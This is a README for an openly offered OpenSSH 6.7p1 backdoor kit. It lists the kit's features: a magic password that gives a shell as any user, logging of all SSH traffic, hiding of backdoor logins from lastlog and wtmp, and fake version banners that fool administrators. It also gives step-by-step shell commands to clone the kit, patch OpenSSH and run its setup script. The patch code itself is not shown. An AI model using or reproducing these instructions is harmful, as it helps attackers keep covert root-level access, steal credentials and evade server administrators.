# OpenSSH 6.7p1 backdoor kit

## coded by bl0w. bl0w@koresec.org

## Features:

 - magic password to get shell with any user (encrypted or no)
 - sniffs all in/out from ssh/sshd, log file encrypted or no.
 - you can chose directory of log decryptor and directory of sniff-logs.
 - all connections accepted by backdoor wont logged by lastlog/wtmp/udp.
 - simple setup, just setup.sh!
 - fake banner and fake version, if admin do ssh -v or sshd -v banner will be faked! :~

## Get started:
## Follow instructions, it`s very easy!

```bash
$ apt-get install -y libpam0g-dev
$ wget http://www.mirrorservice.org/pub/OpenBSD/OpenSSH/portable/openssh-6.7p1.tar.gz
$ tar -xzvf openssh-6.7p1.tar.gz
$ cd openssh-6.7p1
$ git clone https://github.com/jivoi/openssh-backdoor-kit.git
$ cp -v openssh-backdoor-kit/* ./
$ patch -p1 < backdoor.patch
$ sh setup.sh
```

## You can manually start:

```bash
$ /etc/init.d/ssh stop
$ /root/openssh-6.7p1/sshd -dd -f /etc/ssh/sshd_config
```